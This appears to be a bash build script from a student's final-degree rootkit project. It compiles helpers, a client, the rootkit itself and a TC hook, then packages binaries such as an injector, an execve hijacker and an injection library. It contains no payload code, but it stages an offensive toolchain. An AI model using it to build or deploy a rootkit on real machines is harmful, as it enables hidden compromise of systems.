#!/bin/bash
#set -x

## Constants declaration
#The current directory full path
declare -r DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" >/dev/null 2>&1 && pwd )"
#The location of the file where to write the full rootkit package
declare -r OUTPUTDIR="/home/osboxes/TFG/apps/"
#A variable to determine whether to silence output of internal commands
declare firstvar=$1

RED='\033[0;31m'
BLU='\033[0;34m'
GRN='\033[0;32m'
NC='\033[0m' # No Color

## A simple function to wait for input
waitForInput(){
   if [ "$press_key_to_continue" = true ]; then
      echo "Completed. Press any key to continue"
      while [ true ] ; 
      do
         read -t 3 -n 1
         if [ $? = 0 ] ; then
            return ;
         fi
      done
   fi
}

#A simple function to silence output
quiet(){
    if [ "$firstvar" == "quiet" ]; then
        "$@" > /dev/null
    else
        "$@"
    fi
}

#Start of script
echo "*******************************************************\n"
echo "************************* TFG *************************\n"
echo "*******************************************************\n"
echo "***************** Marcos Sánchez Bajo *****************\n"
echo "*******************************************************\n"
echo ""

if [ "${PWD##*/}" != "helpers" ]; then
    echo -e "${RED}This file should be launched from the /helpers directory${NC}"
    exit 1
fi

#First compile helpers
echo -e "${BLU}Compiling helper programs${NC}"
sleep 1
quiet make clean
quiet make
echo -e "${GRN}Finished${NC}"

#Next compile client
echo -e "${BLU}Compiling client programs${NC}"
sleep 1
cd ../client
quiet make clean
quiet make
echo -e "${GRN}Finished${NC}"

echo -e "${BLU}Compiling rootkit${NC}"
sleep 1
cd ../
quiet make clean
quiet make
echo -e "${GRN}Finished${NC}"

echo -e "${BLU}Compiling TC hook${NC}"
sleep 1
quiet make tckit
echo -e "${GRN}Finished${NC}"

echo -e "${BLU}Packaging binary results${NC}"
cp -a bin/kit $OUTPUTDIR
cp -a client/injector $OUTPUTDIR
cp -a helpers/simple_open $OUTPUTDIR
cp -a helpers/simple_timer $OUTPUTDIR
cp -a helpers/execve_hijack $OUTPUTDIR
cp -a helpers/injection_lib.so $OUTPUTDIR
cp -a tc.o $OUTPUTDIR
cp -a client/mycert.pem $OUTPUTDIR
cp -a helpers/deployer.sh $OUTPUTDIR
echo -e "${GRN}Finished${NC}"




